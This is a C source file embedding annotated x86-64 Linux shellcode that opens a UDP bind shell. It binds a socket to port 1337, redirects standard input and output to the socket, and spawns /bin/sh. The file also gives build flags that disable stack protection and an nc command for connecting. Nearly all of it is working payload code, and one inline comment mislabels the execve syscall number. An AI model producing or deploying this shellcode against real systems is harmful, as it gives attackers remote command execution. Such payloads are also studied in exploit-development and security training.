//x64 Linux UDP bind shell x86-64 shellcode

/*
* Author:           FXC
* Build/Run:        gcc -masm=intel -z execstack -fno-stack-protector udp_bind_shell_x64_shellcode.c -o udp_bind_shell_x64_shellcode
*                   nc -u 127.0.0.1 1337
*/

int main(void)
{
	char shellcode[] = 
	"\x6a\x02" 	// push 2
	"\x5f"		// pop rdi
	"\x6a\x02"	// push 2
	"\x5e"		// pop rsi
	"\x48\x31\xd2"	// xor rdx, rdx
	"\x6a\x29"	// push 0x29
	"\x58"		// pop rax
	"\x0f\x05"	// syscall
	"\x50"		// push rax
	"\x5f"		// pop rdi
	"\x48\xba\x02\x00\x05\x39\x7f\x00\x00\x01"	// mov rdx, 0x0100007f39050002
	"\x52"		// push rdx
	"\x52"		// push rdx
	"\x48\x89\xe6"	// mov rsi, rsp
	"\x48\xc7\xc2\x10\x00\x00\x00" 		// mov rdx, 0x10
	"\x6a\x31"	// push 0x31
	"\x58"		// pop rax
	"\x0f\x05"	// syscall
	"\x48\x89\xe6"	// mov rsi, rsp
	"\x68\x00\x08\x00\x00"				// push 0x800
	"\x5a"		// pop rdx
	"\x6a\x02" 	// push 2
	"\x41\x5a"	// pop r10
	"\x52"		// push rdx
	"\x49\x89\xe0"	// mov r8, rsp
	"\x6a\x10" 	// push 0x10
	"\x49\x89\xe1"	// mov r9, rsp
	"\x6a\x2d"	// push 0x2d
	"\x58"		// pop rax
	"\x0f\x05"	// syscall
	"\x4c\x89\xc6"	// mov rsi, r8
	"\x48\xc7\xc2\x10\x00\x00\x00" 		// mov rdx, 0x10
	"\x6a\x2a"	// push 0x2a
	"\x58"		// pop rax
	"\x0f\x05"	// syscall
	"\x48\x31\xf6"	// xor rsi, rsi
	"\x6a\x21"	// push 0x21
	"\x58"		// pop rax
	"\x0f\x05"	// syscall
	"\x6a\x01"	// push 1
	"\x5e"		// pop rsi
	"\x6a\x21"	// push 0x21
	"\x58"		// pop rax
	"\x0f\x05"	// syscall
	"\x6a\x02"	// push 2
	"\x5e"		// pop rsi
	"\x6a\x21"	// push 0x21
	"\x58"		// pop rax
	"\x0f\x05"	// syscall
	"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00"	// mov rax, 0x68732f6e69622f
	"\x50"		// push rax
	"\x48\x89\xe7"	// mov rdi, rsp
	"\x48\x31\xf6"	// xor rsi, rsi
	"\x48\x31\xd2"	// xor rdx, rdx
	"\x6a\x3b"	// push 0x21
	"\x58"		// pop rax
	"\x0f\x05";	// syscall
	
	__asm__(
	"mov rax, 0xffffffffffffffff;"
	"mov rdi, rax;"
	"mov rsi, rax;"
	"mov rdx, rax;"
	"mov rcx, rax;"
	"mov r8, rax;"
	"mov r9, rax;"
	"mov rbx, rax;"
	);
	
	((void(*)(void))shellcode)();
}

